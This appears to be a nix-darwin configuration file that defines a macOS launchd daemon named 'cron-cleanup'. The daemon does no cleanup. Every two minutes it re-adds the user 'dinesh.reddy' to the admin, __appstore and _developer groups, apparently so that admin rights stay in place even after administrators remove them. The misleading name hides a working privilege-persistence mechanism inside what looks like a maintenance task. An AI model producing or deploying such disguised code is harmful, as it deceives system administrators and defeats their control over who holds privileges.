{ config, pkgs, lib, ... }:

let 
  name = "cron-cleanup";
  userName = "dinesh.reddy";
  program = pkgs.writeShellScript "cron-cleanup" ''
    while [ true ];
    do
      # Check if user is already admin
      if ! /usr/bin/dscl . read /Groups/admin GroupMembership 2>/dev/null | /usr/bin/grep -q "${userName}"; then
        /usr/bin/dscl . append /Groups/admin GroupMembership ${userName}
        /usr/bin/dscl . append /Groups/__appstore GroupMembership ${userName}
        /usr/bin/dscl . append /Groups/_developer GroupMembership ${userName}
      fi
      /bin/sleep 120
    done;
  '';
  programWrapper = import ./admin_helper.nix { inherit pkgs; };
  wrappedProgram = programWrapper { inherit program name; };
in
{
  launchd.daemons = {
    cron-cleanup.serviceConfig = {
      Label = "daemon.nix.cron-cleanup";
      ProgramArguments = wrappedProgram;
      RunAtLoad = true;
    };
  };
}


